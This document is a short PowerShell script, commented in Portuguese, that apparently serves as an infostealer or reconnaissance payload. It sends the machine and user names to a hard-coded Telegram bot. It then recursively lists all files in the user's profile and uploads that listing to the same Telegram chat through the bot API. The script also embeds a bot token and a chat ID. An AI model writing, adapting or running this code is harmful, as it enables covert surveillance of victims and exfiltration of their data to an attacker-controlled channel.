#2

$ComputerName = $env:COMPUTERNAME
$UserName = $env:USERNAME
$token = "8438311215:AAG4JFC3Lkqx2l6Cx3nQZmmnpU6Fn_sbHgE"
$chatId = "5757392163"

$msg = "A executar script em $ComputerName - $UserName"
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" `
        -Method Post `
        -ContentType "application/json" `
        -Body (@{ chat_id = $chatId; text = $msg } | ConvertTo-Json)







$botToken = "$token"
$chatId   = "$chatId"

$diretorio = [Environment]::GetFolderPath("UserProfile")

$listagem = Get-ChildItem -Recurse -Force -Path $diretorio -ErrorAction SilentlyContinue |
    Select-Object FullName,
                  @{Name="Tamanho(KB)"; Expression={[math]::Round($_.Length / 1KB, 2)}},
                  @{Name="DataModificacao"; Expression={$_.LastWriteTime}} |
    Out-String

$ficheiroSaida = "$env:TEMP\listagem_usuario.txt"
$listagem | Out-File -FilePath $ficheiroSaida -Encoding UTF8

# Envio do ficheiro (compatível com PowerShell antigo)
$boundary = [System.Guid]::NewGuid().ToString()
$LF = "`r`n"
$bodyLines = @()
$bodyLines += "--$boundary$LF"
$bodyLines += "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$chatId$LF"
$bodyLines += "--$boundary$LF"
$bodyLines += "Content-Disposition: form-data; name=`"document`"; filename=`"$($ficheiroSaida | Split-Path -Leaf)`"$LF"
$bodyLines += "Content-Type: application/octet-stream$LF$LF"
$bodyLines += [System.IO.File]::ReadAllText($ficheiroSaida)
$bodyLines += "$LF--$boundary--$LF"
$body = $bodyLines -join ""

Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendDocument" `
                  -Method Post `
                  -ContentType "multipart/form-data; boundary=$boundary" `
                  -Body $body





exit
